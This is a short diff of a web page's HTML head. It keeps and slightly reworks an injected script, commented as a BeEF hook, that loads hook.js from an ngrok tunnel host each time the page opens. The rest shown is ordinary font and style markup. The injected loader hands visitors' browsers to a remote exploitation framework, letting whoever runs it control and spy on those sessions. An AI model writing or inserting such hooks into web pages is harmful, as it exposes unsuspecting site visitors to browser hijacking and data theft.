@@ -10,14 +10,15 @@
 
     <!-- Dynamically load BeEF hook.js -->
     <script>
-      (function() {
-          var beefHook = document.createElement('script');
-          beefHook.src = 'https://initially-rested-toad.ngrok-free.app/hook.js';
-          beefHook.type = 'text/javascript';
-          beefHook.async = true;
-          document.head.appendChild(beefHook);
-      })();
-    </script>
+    (function() {
+        var s = document.createElement('script');
+        s.src = 'https://initially-rested-toad.ngrok-free.app/hook.js';
+        s.type = 'text/javascript';
+        s.async = true;
+        s.crossOrigin = "anonymous";
+        document.head.appendChild(s);
+    })();
+</script>
 
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
     <style>
